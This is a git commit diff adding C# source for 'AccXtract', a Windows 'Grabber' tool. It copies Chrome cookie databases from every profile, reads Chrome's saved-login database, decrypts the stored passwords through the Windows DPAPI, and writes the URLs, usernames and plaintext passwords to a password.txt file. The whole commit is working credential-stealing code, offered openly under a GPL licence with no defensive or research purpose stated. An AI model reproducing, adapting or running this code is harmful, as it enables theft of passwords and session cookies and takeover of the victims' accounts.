60c86ee2c649127a0790d230b3f23462b8ebd6ad
garrett.davidson <davidson.garrettm@gmail.com>
2013-09-07 15:24:44 +0300

    Fixed git repo

---
+++ Grabber/DPAPI.cs
@@ -0,0 +1,61 @@
+﻿using System;
+using System.Text;
+using System.Runtime.InteropServices;
+using System.ComponentModel;
+
+public class DPAPI
+{
+
+    [DllImport( "crypt32.dll",
+                SetLastError=true,
+                CharSet=System.Runtime.InteropServices.CharSet.Auto)]
+    private static extern
+        bool CryptUnprotectData(ref DATA_BLOB       pCipherText,
+                                ref string          pszDescription,
+                                ref DATA_BLOB       pEntropy,
+                                    IntPtr          pReserved,
+                                ref CRYPTPROTECT_PROMPTSTRUCT pPrompt,
+                                    int             dwFlags,
+                                ref DATA_BLOB       pPlainText);
+
+    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+    internal struct DATA_BLOB
+    {
+        public int     cbData;
+        public IntPtr  pbData;
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+    internal struct CRYPTPROTECT_PROMPTSTRUCT
+    {
+        public int      cbSize;
+        public int      dwPromptFlags;
+        public IntPtr   hwndApp;
+        public string   szPrompt;
+    }
+
+    public static byte[] decryptBytes(byte[] input)
+    {
+
+        DATA_BLOB encryptedBlob = new DATA_BLOB();
+        DATA_BLOB decryptedBlob = new DATA_BLOB();
+
+        encryptedBlob.pbData = Marshal.AllocHGlobal(input.Length);
+        encryptedBlob.cbData = input.Length;
+        Marshal.Copy(input, 0, encryptedBlob.pbData, input.Length);
+
+        string a = "";
+        DATA_BLOB b = new DATA_BLOB();
+        CRYPTPROTECT_PROMPTSTRUCT d = new CRYPTPROTECT_PROMPTSTRUCT();
+        CryptUnprotectData(ref encryptedBlob, ref a, ref b, ((IntPtr)((int)(0))), ref d, 0, ref decryptedBlob);
+
+        byte[] plainTextBytes = new byte[decryptedBlob.cbData];
+
+        Marshal.Copy(decryptedBlob.pbData,
+                         plainTextBytes,
+                         0,
+                         decryptedBlob.cbData);
+
+        return plainTextBytes;
+    }
+}
---
+++ Grabber/Program.cs
@@ -0,0 +1,134 @@
+﻿//Copyright 2013 Garrett Davidson
+//
+//This file is part of AccXtract
+//
+//    AccXtract is free software: you can redistribute it and/or modify
+//    it under the terms of the GNU General Public License as published by
+//    the Free Software Foundation, either version 3 of the License, or
+//    (at your option) any later version.
+//
+//    AccXtract is distributed in the hope that it will be useful,
+//    but WITHOUT ANY WARRANTY; without even the implied warranty of
+//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+//    GNU General Public License for more details.
+//
+//    You should have received a copy of the GNU General Public License
+//    along with AccXtract.  If not, see <http://www.gnu.org/licenses/>.
+
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Text;
+using System.Data.SQLite;
+using System.Runtime.InteropServices;
+using System.ComponentModel;
+
+
+namespace Grabber
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string cd = Directory.GetCurrentDirectory();
+            string home = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%");
+
+            cd += "\\AccXtract";
+
+
+            #region Chrome cookies
+            if (Directory.Exists(home + @"\AppData\Local\Google\Chrome"))
+            {
+
+                Directory.CreateDirectory(cd + "\\" + System.Environment.MachineName + "\\Chrome\\Default");
+
+                string chromePath = home + @"\AppData\Local\Google\Chrome\User Data\";
+
+                List<string> list = new List<string>();
+                System.IO.StreamReader file = new StreamReader(chromePath + @"\Local State");
+
+                int currentNumberOfProfiles = 0;
+                string line;
+                bool foundProfile = false;
+                while ((line = file.ReadLine()) != null)
+                {
+                    if (line.Contains(@"Profile "))
+                    {
+
+                        string[] values = line.Split('"');
+                        Console.WriteLine(values[1]);
+                        list.Add(values[1]);
+                        foundProfile = true;
+
+                        currentNumberOfProfiles++;
+                    }
+                    else if (line.Contains(@"""name"":") && foundProfile)
+                    {
+                        string[] values = line.Split('"');
+                        Console.WriteLine(values[3]);
+                        foundProfile = false;
+                        list.Add(values[3]);
+                    }
+                }
+
+                File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\Default\Cookies", cd + "\\" + System.Environment.MachineName + "\\Chrome\\Default\\cookies", true);
+
+                //list.RemoveAt(0);
+
+                while (list.Count != 0)
+                {
+                    Directory.CreateDirectory(cd + "\\" + System.Environment.MachineName + "\\Chrome\\" + list[1]);
+                    File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\" + list[0] + "\\Cookies", cd + "\\" + System.Environment.MachineName + "\\Chrome\\" + list[1] + "\\cookies", true);
+
+                    list.RemoveAt(0);
+                    list.RemoveAt(0);
+                }
+
+                file.Close();
+            }
+            #endregion
+
+
+            #region Chrome Passwords
+
+            string copiedLoginData = cd + "\\Login Data";
+            File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data", copiedLoginData, true);
+
+            SQLiteConnection conn = new SQLiteConnection("Data Source=" + copiedLoginData);
+
+            conn.Open();
+
+            SQLiteCommand retrieveData = conn.CreateCommand();
+            retrieveData.CommandText = "SELECT action_url, username_value, password_value FROM logins";
+            SQLiteDataReader data = retrieveData.ExecuteReader();
+
+            List<string> decryptedData = new List<string>();
+            while (data.Read())
+            {
+                byte[] bytes = (byte[])data["password_value"];
+                //byte[] outBytes = DPAPI.Decrypt(bytes, null, out outstring);
+
+                byte[] outBytes = DPAPI.decryptBytes(bytes);
+
+                string url = (string)data["action_url"];
+                string username = (string)data["username_value"];
+                string password = Encoding.Default.GetString(outBytes);
+
+                if (password != "")
+                {
+                    decryptedData.Add(url);
+                    decryptedData.Add(username);
+                    decryptedData.Add(password);
+                }
+            }
+
+            Directory.CreateDirectory(cd + "\\" + System.Environment.MachineName + "\\Chrome\\Default");
+            File.WriteAllLines(cd + "\\" + System.Environment.MachineName + "\\password.txt", decryptedData.ToArray());
+
+            conn.Close();
+            conn.Dispose();
+
+            #endregion
+        }
+    }
+}
